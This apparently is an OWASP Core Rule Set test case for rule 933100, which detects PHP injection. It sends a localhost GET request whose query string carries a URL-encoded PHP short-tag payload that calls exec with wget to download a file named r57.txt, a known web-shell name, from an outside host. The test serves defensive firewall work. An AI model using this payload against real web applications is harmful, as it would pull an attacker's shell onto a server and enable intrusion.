rule_id: 933100
tests:
  - test_id: 1
    desc: |
      PHP Injection Attack: Short tag with exec function
      decoded payload: <? exec('wget http://r57.biz/r57.txt -O
    stages:
      - input:
          dest_addr: 127.0.0.1
          headers:
            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
            Accept-Encoding: gzip,deflate
            Accept-Language: en-us,en;q=0.5
            Host: localhost
            Keep-Alive: '300'
            Proxy-Connection: keep-alive
            User-Agent: "OWASP CRS test agent"
          method: GET
          port: 80
          uri: "/get?foo=%3C%3F%20exec%28%27wget%20http%3A%2F%2Fr57.biz%2Fr57.txt%20-O"
          version: HTTP/1.1
        output:
          log:
            expect_ids: [933100]
